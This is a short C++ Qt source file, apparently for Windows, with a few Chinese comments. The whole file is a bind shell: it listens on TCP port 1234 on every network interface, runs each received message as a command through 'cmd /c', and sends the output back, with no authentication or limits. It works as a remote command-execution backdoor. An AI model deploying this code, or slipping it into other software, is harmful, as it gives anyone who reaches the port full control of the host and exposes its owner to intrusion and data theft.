#include "mainwindow.h"

#include <QApplication>
#include<QtNetwork/qtcpserver.h>
#include<QtNetwork/qtcpsocket.h>
#include<QObject>
#include<QProcess>

int main(int argc, char *argv[])
{
    QTcpServer server;
    server.listen(QHostAddress::Any,1234);
    while(!server.waitForNewConnection());
    QTcpSocket *client=server.nextPendingConnection();
    QString str="connect successful";
    QByteArray message=str.toUtf8();
    client->write(message);
    while(1){
        client->waitForReadyRead();
    message=client->readAll();
    qDebug()<<message.toStdString().c_str();
    if(message.toStdString()=="break")
        break;
    QProcess process;
    process.setProgram("cmd");
    QStringList argument;
    argument<<"/c"<<message.toStdString().c_str();
    process.setArguments(argument);
    process.start();
    process.waitForStarted(); //等待程序启动
    process.waitForFinished();//等待程序关闭
   client->write(process.readAllStandardOutput());//system(message.toStdString().c_str());
        }
}
